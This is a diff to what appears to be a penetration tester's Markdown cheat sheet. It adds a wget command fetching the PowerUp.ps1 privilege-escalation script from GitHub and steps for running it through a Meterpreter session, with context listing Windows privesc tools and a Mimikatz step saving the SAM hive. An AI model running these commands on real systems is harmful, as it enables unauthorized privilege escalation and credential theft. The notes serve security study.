@@ -572,8 +572,15 @@ Output file contents:
 ### Windows Privesc Scripts
 - winPEASany.exe
 - Seatbelt.exe
-- PowerUp.ps1
+- PowerUp.ps1: `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1`
 - SharpUp.exe
+
+### PowerUp.ps1 with Metasploit
+- `upload <location of PowerUp.ps1>`
+- in meterpreter shell: `load powershell`
+- switch to powershell: `powershell_shell`
+- run script: `. .\PowerUp.ps1`
+- `Invoke-AllChecks`
 
 ## Mimikatz
 - dump SAM hive (in cmd): `reg save HKLM\SAM SAM`
